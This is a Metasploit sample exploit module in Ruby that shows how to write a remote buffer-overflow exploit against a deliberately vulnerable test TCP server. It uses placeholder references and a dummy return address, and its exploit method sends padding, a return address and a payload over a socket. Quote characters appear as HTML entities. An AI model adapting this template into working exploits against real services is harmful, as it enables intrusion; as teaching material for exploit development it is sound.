# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

###
#
# This exploit sample shows how an exploit module could be written to exploit
# a bug in an arbitrary TCP server.
#
###
class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  #
  # This exploit affects TCP servers, so we use the TCP client mixin.
  # See ./documentation/samples/vulnapps/testsrv/testsrv.c for building the
  # vulnerable target program.
  #
  include Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      # The Name should be just like the line of a Git commit - software name,
      # vuln type, class. It needs to fit in 50 chars ideally. Preferably apply
      # some search optimization so people can actually find the module.
      # We encourage consistency between module name and file name.
      &#039;Name&#039;           => &#039;Sample Exploit&#039;,
      &#039;Description&#039;    => %q{
          This exploit module illustrates how a vulnerability could be exploited
        in an TCP server that has a parsing bug.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         => [&#039;skape&#039;],
      &#039;References&#039;     =>
        [
          [ &#039;OSVDB&#039;, &#039;12345&#039; ],
          [ &#039;EDB&#039;, &#039;12345&#039; ],
          [ &#039;URL&#039;, &#039;http://www.example.com&#039;],
          [ &#039;CVE&#039;, &#039;1978-1234&#039;],
        ],
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039;    => 1000,
          &#039;BadChars&#039; => "\x00",
        },
      &#039;Targets&#039;        =>
        [
          # Target 0: Windows All
          [
            &#039;Windows XP/Vista/7/8&#039;,
            {
              &#039;Platform&#039; => &#039;win&#039;,
              &#039;Ret&#039;      => 0x41424344
            }
          ],
        ],
      &#039;DisclosureDate&#039; => "Apr 1 2013",
      # Note that this is by index, rather than name. It&#039;s generally easiest
      # just to put the default at the beginning of the list and skip this
      # entirely.
      &#039;DefaultTarget&#039;  => 0))
  end

  #
  # The sample exploit just indicates that the remote host is always
  # vulnerable.
  #
  def check
    Exploit::CheckCode::Vulnerable
  end

  #
  # The exploit method connects to the remote service and sends 1024 random bytes
  # followed by the fake return address and then the payload.
  #
  def exploit
    connect

    print_status("Sending #{payload.encoded.length} byte payload...")

    # Build the buffer for transmission
    buf  = rand_text_alpha(1024)
    buf << [ target.ret ].pack(&#039;V&#039;)
    buf << payload.encoded

    # Send it off
    sock.put(buf)
    sock.get_once

    handler
  end

end

